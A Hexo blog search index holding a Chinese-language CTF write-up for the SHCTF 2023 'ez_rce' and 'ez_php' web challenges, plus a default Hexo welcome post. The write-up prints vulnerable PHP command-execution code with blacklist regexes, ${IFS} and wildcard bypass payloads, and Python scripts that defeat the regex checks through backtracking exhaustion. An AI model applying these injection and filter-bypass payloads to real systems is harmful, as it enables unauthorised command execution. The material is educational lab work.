<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>test</title>
      <link href="/2023/10/24/test/"/>
      <url>/2023/10/24/test/</url>
      
        <content type="html"><![CDATA[<h3 id="1-ez-rce"><a href="#1-ez-rce" class="headerlink" title="1.ez_rce"></a>1.ez_rce</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$rce</span> = <span class="variable">$_GET</span>[<span class="string">'rce'</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$rce</span>)) {</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">"/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\&gt;|\&lt;|\'|\"/i"</span>, <span class="variable">$rce</span>)) {</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$rce</span>);</span><br><span class="line">    }<span class="keyword">else</span> {</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hhhhhhacker!!!"</span>.<span class="string">"\n"</span>;</span><br><span class="line">    }</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?rce=ls  <span class="comment">#有flag.php</span></span><br><span class="line">?rce=cp${IFS}fla?.php${IFS}a.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">'GZCTF_FLAG'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag</span>==<span class="string">"not_flag"</span> <span class="keyword">or</span> <span class="variable">$flag</span>==<span class="string">""</span>){</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">"dzctf{test_flag}"</span>;</span><br><span class="line">}   <span class="comment">#假的flag</span></span><br><span class="line"></span><br><span class="line">?rce=ls${IFS}/ <span class="comment">#有flag</span></span><br><span class="line">?rce=cp${IFS}/fla?${IFS}a.php   <span class="comment">#然后url/a.php 可得flag</span></span><br></pre></td></tr></tbody></table></figure><h3 id="2-ez-php"><a href="#2-ez-php" class="headerlink" title="2.ez_php"></a>2.ez_php</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">'./index.txt'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'c_ode'</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'num'</span>]))</span><br><span class="line">{</span><br><span class="line">    <span class="variable">$code</span> = (String)<span class="variable">$_POST</span>[<span class="string">'c_ode'</span>];</span><br><span class="line">    <span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">'num'</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">"/[0-9]/"</span>, <span class="variable">$num</span>))</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no number!"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">elseif</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">'/.+?SHCTF/is'</span>, <span class="variable">$code</span>))</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'no touch!'</span>);</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$code</span>,<span class="string">'2023SHCTF'</span>) === <span class="literal">FALSE</span>)</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'what do you want'</span>);</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    }</span><br><span class="line">} </span><br></pre></td></tr></tbody></table></figure><p><a href="https://blog.csdn.net/wangyuxiang946/article/details/131156104">PHP intval()函数详解，intval()函数漏洞原理及绕过思路_intval绕过-CSDN</a></p><p><strong>回溯法绕过正则匹配</strong></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://112.6.51.212:31842/?num[]=1"</span></span><br><span class="line">data={</span><br><span class="line"><span class="string">'c[ode'</span>:<span class="string">'a'</span>*<span class="number">1000000</span>+<span class="string">'2023SHCTF'</span>  </span><br><span class="line">}</span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></tbody></table></figure><h4 id="本题与下面一道题进行对比："><a href="#本题与下面一道题进行对比：" class="headerlink" title="本题与下面一道题进行对比："></a>本题与下面一道题进行对比：</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$as</span>=<span class="variable">$_POST</span>[<span class="string">'as'</span>];</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">'code'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"><span class="variable">$code</span></span>)</span>{</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">"/php|cat|tac|assert|pcntl_exec|fwrite|curl|sleep|eval|system|assert|flag|shell_exec|passthru|exec|F10g|fl0g|fl1g|phar/i"</span>,<span class="string">''</span>,<span class="variable">$code</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$as</span>)){</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match_all</span>(<span class="string">'/but.*how/is'</span>,<span class="variable">$as</span>)){</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$as</span>,<span class="string">'but how'</span>)!==<span class="literal">false</span>){</span><br><span class="line">            </span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">process</span>(<span class="variable">$code</span>));</span><br><span class="line">            </span><br><span class="line">        }<span class="keyword">else</span>{</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'tip: backup file there'</span>);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    }<span class="keyword">else</span>{</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'NO there'</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">""</span></span><br><span class="line">data={</span><br><span class="line"><span class="string">'as'</span>:<span class="string">'but how'</span>+<span class="string">'a'</span>*<span class="number">1000000</span>,</span><br><span class="line"><span class="string">'code'</span>:<span class="string">'sort /flflagag'</span></span><br><span class="line">}</span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></tbody></table></figure><p>正则回溯地方不同点在于前者是stripos()函数，后者是strpos()函数。</p><p>[<a href="https://blog.csdn.net/taoshihan/article/details/101249530">PHP] strpos stripos strrpos strripos的区别-CSDN博客</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/10/24/hello-world/"/>
      <url>/2023/10/24/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><p><img src="F:/blog/blog/source/_posts/hello-world.assets/image-20231024202739277.png" alt="image-20231024202739277"></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
